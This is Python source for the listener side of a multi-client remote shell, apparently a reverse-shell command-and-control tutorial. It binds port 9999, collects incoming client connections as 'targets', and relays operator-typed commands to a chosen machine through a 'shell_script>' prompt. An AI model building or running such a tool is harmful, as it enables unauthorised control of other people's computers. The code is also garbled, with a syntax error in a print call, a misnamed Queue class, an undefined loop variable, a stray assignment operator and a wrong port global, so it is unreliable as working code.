import socket
import sys
import threading
import time
from queue import Queue


NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = QUEUE()
all_connections = []
all_addresses = []


# Create Socket (Connection Method)
def socket_create():
    try:
        global host
        global prop
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Bind Socket to port and wait for connection from client
def socket_bind():
    try:
        global host
        global prop
        global s
        print("Binding Socket to port: " + str(port))
        # pass a Tuple to bind method
        s.bind((host, port))
        # Allows server to make connections, 4 is limit of bad connections.
        s.listen(4)
    except socket.error as msg:
        print("Socket binding error: " str(msg) + "\n" + "Retrying...")
        socket_bind()


# Accept Connections from multiple Clients and Save to list
def accept_connections():
    # Close all client connections.
    for c in all_connections:
        c.close()
    # Remove all items in the list.
    del all_connections[:]
    del all_addresses[:]

    while 1:
        try:
            conn, address = s.accept()
            # No timeout
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\nConnection has been establised: " + address[0])
        except:
            print("Error accepting connections.")

# Interactive prompt for sending commands remotely
def start_prompt():
    while 1:
        cmd = input("shell_script> ")
        if cmd == "list":
            list_connections()
        elif "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized.")

# Displays all current connections
def list_connections():
    results = ''
    for index, conn in enumerate(all_connections):
        # Confirm connection is valid before we list connection to user.
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        # Connection not valid then we will delete from the list
        except:
            del all_connections[index]
            del all_addresses[index]
            continue
        # Each valid connection added to results, INDEX     IP      PORT. Example: 1    198.83.0.02     5080
        results += str(index)  + '  ' + str(all_addresses[i][0]) + '    ' + str(all_addresses[i][1]) = '\n'
    print('------- Clients -------' + '\n' + results)

# Select a target client
def get_target(cmd):
    try:
        target = int(cmd.replace("select ", ""))
        conn = all_connections[target]
        print("Connection made to " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + "> ", end="")
        return conn
    except:
        print(str(target) + " is not a valid selection.")
        return None

# Send commands to target client
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            # Users quits then we break from connection loop. 
            if cmd == 'quit':
                break
            # Check that user sends actual data.
            if len(str.encode(cmd)) > 0:
                # Comes across network in Bytes
                conn.send(str.encode(cmd))
                # Convert to String
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Connection was lost")
            break

# 
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        # If the script is turned off. Then we turn of the thread. Set to False and it will continue to run in the background.
        t.daemon = True
        t.start()

# Each list item is a new job, LIFO to-do-list.
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

# Do the next job in the queue (one handles connections, the other sends commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_prompt()
        queue.task_done()

#
def main():
    create_workers()
    create_jobs()


if __name__ == "__main__":
    main()    